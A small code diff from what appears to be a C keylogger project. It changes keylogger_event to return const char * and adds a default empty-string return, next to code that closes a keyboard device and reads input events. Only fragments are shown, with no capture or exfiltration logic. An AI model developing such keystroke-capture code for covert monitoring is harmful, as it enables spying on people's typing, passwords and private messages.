@@ -67,7 +67,7 @@ void keylogger_exit(void)
     close(keyboard_fd);
 }
 
-char *keylogger_event()
+const char *keylogger_event()
 {
     int shift_flag, altgr_flag = 0;
     struct input_event event;
@@ -99,4 +99,5 @@ char *keylogger_event()
             }
         }
     }
+    return "";
 }
